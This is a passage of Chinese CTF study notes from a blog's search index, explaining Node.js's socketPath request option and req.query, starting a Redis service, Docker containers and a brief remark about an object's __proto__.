HTTPS 请求时指定与服务器通信的 Unix 套接字路径。\n当请求的目标是通过 Unix 套接字进行通信时，可以使用 socketPath 字段来指定服务器的 Unix 套接字路径。这样，请求将通过该套接字与服务器建立连接，并进行后续的 HTTP 或 HTTPS 通信。\n例如，可以在发起请求时设置 socketPath 字段如下：\ntypescript\nconst options = &#123;\n  socketPath: '/var/run/myserver.sock',\n  // 其他请求选项...\n&#125;;\n\nconst req = http.request(options, (res) => &#123;\n  // 处理响应...\n&#125;);\n\nreq.end();\n\n在上述示例中，通过将 socketPath 字段设置为 &#39;/var/run/myserver.sock&#39;，请求将使用该 Unix 套接字路径与服务器建立连接。\n需要注意的是，socketPath 字段是在 http.d.ts 类型声明文件中定义的，用于在 TypeScript 项目中提供类型信息和类型检查支持，以确保在开发过程中使用正确的类型和参数。\n启动redis服务器\nservice redis-server start \n\n\n\n\n\n\n\n这里的obj已经是object了，是{urls}的__proto__\n\n在 Node.js 中，req.query 对象表示客户端发送的 HTTP 请求中的查询参数（query parameters）。查询参数是在 URL 中以 “?” 符号开始的字符串，通常用于向服务器传递键值对。\n例如，如果客户端发送以下 HTTP 请求：\nGET /search?q=JavaScript&amp;limit=10 HTTP/1.1\nHost: example.com\n\n\n那么 req.query 对象将包含以下属性：\n\n&#123;\n  q: 'JavaScript',\n  limit: '10'\n&#125;\n\n\n\n\n\n\n\n一旦您启动了 Docker 容器，您可以在容器中运行各种应用程序和服务，包括 Nginx 和 Redis。您可以通过容器的 IP 地址、主机名或映射的端口号与容器内运行的应用程序进行通信。\n","slug":"SCTF","date":"2023-07-31T12:34:40.000Z","categories_index":"","tags_index":"CTF","author_index":"XyM4ster"}]